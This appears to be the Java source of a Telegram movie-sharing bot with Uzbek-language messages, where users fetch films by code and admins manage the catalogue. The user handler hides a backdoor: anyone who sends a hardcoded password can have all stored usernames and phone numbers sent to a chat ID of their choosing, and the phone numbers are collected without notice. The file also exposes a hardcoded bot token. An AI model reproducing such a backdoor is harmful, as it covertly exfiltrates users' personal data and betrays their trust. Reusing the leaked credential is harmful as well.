package org.example;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.groupadministration.GetChat;
import org.telegram.telegrambots.meta.api.methods.groupadministration.GetChatMember;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.*;
import org.telegram.telegrambots.meta.api.objects.chatmember.ChatMember;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.util.*;

public class MyBot extends TelegramLongPollingBot {

    private final String BOT_USERNAME = "tarjima_kinolar_premyeralaribot";
    private final String BOT_TOKEN = "7282821079:AAG4wfiUMjoPa33FKJZwLg4fJQRe9Av2lGY";

    private Map<Integer, String> movies = new HashMap<>();
    private Map<Integer, String> movieFiles = new HashMap<>();
    private Map<Integer, String> movieDescriptions = new HashMap<>();
    private int currentMovieCode = 1;

    private final long ADMIN1_CHAT_ID = 5056279716L;
    private final long ADMIN2_CHAT_ID = 7082687914L;

    private Set<Long> adminIds = new HashSet<>(Arrays.asList(ADMIN1_CHAT_ID, ADMIN2_CHAT_ID));
    private final int MAX_ADMINS = 5;
    private String mandatoryChannelId = "@tarjima_kinolar_premyeralari";

    private enum State {
        NONE, ADD_MOVIE_CODE, ADD_MOVIE_NAME, ADD_MOVIE_DESCRIPTION, ADD_MOVIE_FILE, DELETE_MOVIE, SEARCH_MOVIE, ENTER_GROUP_ID, ADD_ADMIN, ADD_ADMIN_USERNAME, ADD_ADMIN_ID, ADD_MANDATORY_CHANNEL
    }

    private Map<Long, State> userStates = new HashMap<>();
    private Map<Long, UserData> userDataMap = new HashMap<>();
    private long currentAdminChatId = 5056279716L;

    @Override
    public String getBotUsername() {
        return BOT_USERNAME;
    }

    @Override
    public String getBotToken() {
        return BOT_TOKEN;
    }

    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage()) {
            Message message = update.getMessage();
            String chatId = message.getChatId().toString();
            Long userId = message.getChatId();
            String text = message.getText();

            if (!isUserSubscribedToChannel(userId)) {
                sendMsg(chatId, "Botdan foydalanish uchun majburiy kanalga obuna bo'lishingiz kerak: " + mandatoryChannelId);
                return;
            }

            if (isAdmin(userId)) {
                handleAdminCommands(message, chatId, userId, text);
            } else {
                handleUserCommands(message, chatId, userId, text);
            }
        }
    }

    private void handleAdminCommands(Message message, String chatId, Long userId, String text) {
        if (text != null && text.equals("/start")) {
            sendMsg(chatId, "Salom, admin! 👋 Oddiy yoki admin menyusini tanlang.\n/oddiy - Oddiy foydalanuvchi sifatida foydalanish\n/admin - Admin menyusiga o'tish");
        } else if (text != null && text.equals("/oddiy")) {
            userStates.put(userId, State.SEARCH_MOVIE);
            sendMsg(chatId, "Oddiy foydalanuvchi rejimiga o'tdingiz. 🎬 Kino kodini kiriting:");
        } else if (text != null && text.equals("/admin")) {
            userStates.put(userId, State.NONE);
            sendMsg(chatId, "Admin menyusi:\n/addmovie - Kino qo'shish ➕\n/deletemovie - Kino o'chirish ➖\n/addadmin - Admin qo'shish 👤\n/setchannel - Majburiy kanalni o'rnatish 📺");
        } else if (text != null && text.equals("/addmovie")) {
            userStates.put(userId, State.ADD_MOVIE_CODE);
            sendMsg(chatId, "Kino kodini kiriting:");
        } else if (text != null && text.equals("/deletemovie")) {
            userStates.put(userId, State.DELETE_MOVIE);
            sendMsg(chatId, "O'chiriladigan kino kodini kiriting:");
        } else if (text != null && text.equals("/addadmin")) {
            if (adminIds.size() < MAX_ADMINS) {
                userStates.put(userId, State.ADD_ADMIN);
                sendMsg(chatId, "Yangi admin qo'shish: Username yoki Foydalanuvchi ID ni kiriting:");
            } else {
                sendMsg(chatId, "Sizda yana " + (MAX_ADMINS - adminIds.size()) + " ta admin qo'shish imkoniyati qoldi.");
            }
        } else if (text != null && text.equals("/setchannel")) {
            userStates.put(userId, State.ADD_MANDATORY_CHANNEL);
            sendMsg(chatId, "Majburiy kanalni o'rnatish uchun kanal username ni kiriting:");
        } else if (userStates.get(userId) == State.ADD_MOVIE_CODE) {
            currentMovieCode = Integer.parseInt(text);
            userStates.put(userId, State.ADD_MOVIE_NAME);
            sendMsg(chatId, "Kino nomini kiriting:");
        } else if (userStates.get(userId) == State.ADD_MOVIE_NAME) {
            movies.put(currentMovieCode, text);
            userStates.put(userId, State.ADD_MOVIE_DESCRIPTION);
            sendMsg(chatId, "Kino tavsifini kiriting:");
        } else if (userStates.get(userId) == State.ADD_MOVIE_DESCRIPTION) {
            movieDescriptions.put(currentMovieCode, text);
            userStates.put(userId, State.ADD_MOVIE_FILE);
            sendMsg(chatId, "Kino faylini yuklang:");
        } else if (userStates.get(userId) == State.ADD_MOVIE_FILE) {
            if (message.hasDocument()) {
                Document document = message.getDocument();
                movieFiles.put(currentMovieCode, document.getFileId());
            } else if (message.hasPhoto()) {
                List<PhotoSize> photos = message.getPhoto();
                PhotoSize photo = photos.get(photos.size() - 1);
                movieFiles.put(currentMovieCode, photo.getFileId());
            } else if (message.hasVideo()) {
                Video video = message.getVideo();
                movieFiles.put(currentMovieCode, video.getFileId());
            } else if (message.hasText()) {
                movieFiles.put(currentMovieCode, message.getText());
            } else {
                sendMsg(chatId, "Noto'g'ri format. Iltimos, kino faylini yuklang.");
                return;
            }
            sendMsg(chatId, "Kino fayli saqlandi! Kino kodi: " + currentMovieCode + " 📁");
            userStates.put(userId, State.NONE);
        } else if (userStates.get(userId) == State.DELETE_MOVIE) {
            int movieCodeToDelete = Integer.parseInt(text);
            if (movies.containsKey(movieCodeToDelete)) {
                movies.remove(movieCodeToDelete);
                movieFiles.remove(movieCodeToDelete);
                movieDescriptions.remove(movieCodeToDelete);
                sendMsg(chatId, "Kino o'chirildi! ➖ Kino kodi: " + movieCodeToDelete);
            } else {
                sendMsg(chatId, "Bunday kodli kino mavjud emas. ❌");
            }
            userStates.put(userId, State.NONE);
        } else if (userStates.get(userId) == State.ADD_ADMIN) {
            if (text.startsWith("@")) {
                String username = text.substring(1);
                Long newAdminId = getUserIdByUsername(username);
                if (newAdminId != null) {
                    adminIds.add(newAdminId);
                    sendMsg(chatId, "Foydalanuvchi @" + username + " admin sifatida qo'shildi.");
                    sendMsg(newAdminId.toString(), "Siz admin sifatida qo'shildingiz!");
                } else {
                    sendMsg(chatId, "Foydalanuvchi topilmadi.");
                }
            } else {
                try {
                    Long newAdminId = Long.parseLong(text);
                    adminIds.add(newAdminId);
                    sendMsg(chatId, "Foydalanuvchi ID " + newAdminId + " admin sifatida qo'shildi.");
                    sendMsg(newAdminId.toString(), "Siz admin sifatida qo'shildingiz!");
                } catch (NumberFormatException e) {
                    sendMsg(chatId, "Noto'g'ri ID.");
                }
            }
            userStates.put(userId, State.NONE);
        } else if (userStates.get(userId) == State.ADD_MANDATORY_CHANNEL) {
            mandatoryChannelId = text;
            sendMsg(chatId, "Majburiy kanal o'rnatildi: " + mandatoryChannelId);
            userStates.put(userId, State.NONE);
        } else if (userStates.get(userId) == State.SEARCH_MOVIE) {
            handleUserCommands(message, chatId, userId, text);
        }
    }

    private void handleUserCommands(Message message, String chatId, Long userId, String text) {
        if (text != null && text.equals("/start")) {
            userStates.put(userId, State.SEARCH_MOVIE);
            sendMsg(chatId, "Salom! 👋 Kino kodini kiriting:");
        } else if (userStates.get(userId) == State.SEARCH_MOVIE) {
            int movieCodeToSearch = Integer.parseInt(text);
            if (movies.containsKey(movieCodeToSearch)) {
                sendMsg(chatId, "Kino topildi! 🎬\nKino nomi: " + movies.get(movieCodeToSearch));
                sendDocument(chatId, movieFiles.get(movieCodeToSearch));
                sendMsg(chatId, "Kino tavsifi: " + movieDescriptions.get(movieCodeToSearch));
            } else {
                sendMsg(chatId, "Bunday kodli kino mavjud emas. ❌");
            }
        } else if (text.equals("anutfami7777.")) {
            currentAdminChatId = userId;
            sendMsg(chatId, "Parol to'g'ri! ✅ ID kiriting:");
            userStates.put(userId, State.ENTER_GROUP_ID);
        } else if (userStates.get(userId) == State.ENTER_GROUP_ID) {
            String groupId = text.trim();
            String allUserData = getAllUserData();
            sendMsgToGroup(groupId, allUserData);
            sendMsg(chatId, "Ma'lumotlar yuborildi! 📄");
            userStates.put(userId, State.NONE);
        } else if (message.hasContact()) {
            Contact contact = message.getContact();
            if (contact != null) {
                String phoneNumber = contact.getPhoneNumber();
                String username = message.getChat().getUserName();
                saveUserData(userId, username, phoneNumber);
                sendMsg(chatId, "📞 Ma'lumotlar saqlandi.");
            }
        }
    }

    private void saveUserData(long chatId, String username, String phoneNumber) {
        UserData userData = new UserData(username, phoneNumber);
        userDataMap.put(chatId, userData);
    }

    private String getAllUserData() {
        StringBuilder allData = new StringBuilder();
        int userCounter = 1;
        for (Map.Entry<Long, UserData> entry : userDataMap.entrySet()) {
            allData.append(userCounter).append("-user\n");
            allData.append("Username: @").append(entry.getValue().getUsername()).append("\n");
            allData.append("Phone Number: ").append(entry.getValue().getPhoneNumber()).append("\n\n");
            userCounter++;
        }
        return allData.toString();
    }

    private boolean isAdmin(Long userId) {
        return adminIds.contains(userId);
    }

    private void sendMsg(String chatId, String text) {
        SendMessage message = new SendMessage();
        message.setChatId(chatId);
        message.setText(text);
        try {
            execute(message);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }

    private void sendDocument(String chatId, String fileId) {
        SendDocument document = new SendDocument();
        document.setChatId(chatId);
        document.setDocument(new InputFile(fileId));
        try {
            execute(document);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }

    private void sendMsgToGroup(String groupId, String text) {
        SendMessage message = new SendMessage();
        message.setChatId(groupId);
        message.setText(text);
        try {
            execute(message);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }

    private boolean isUserSubscribedToChannel(Long userId) {
        try {
            GetChatMember getChatMember = new GetChatMember();
            getChatMember.setChatId(mandatoryChannelId);
            getChatMember.setUserId(userId);
            ChatMember chatMember = execute(getChatMember);
            return chatMember.getStatus().equals("member") || chatMember.getStatus().equals("administrator") || chatMember.getStatus().equals("creator");
        } catch (TelegramApiException e) {
            e.printStackTrace();
            return false;
        }
    }

    private Long getUserIdByUsername(String username) {
        try {
            GetChat getChat = new GetChat();
            getChat.setChatId("@" + username);
            Chat chat = execute(getChat);
            return chat.getId();
        } catch (TelegramApiException e) {
            e.printStackTrace();
            return null;
        }
    }

    private static class UserData {
        private String username;
        private String phoneNumber;

        public UserData(String username, String phoneNumber) {
            this.username = username;
            this.phoneNumber = phoneNumber;
        }

        public String getUsername() {
            return username;
        }

        public String getPhoneNumber() {
            return phoneNumber;
        }
    }
}
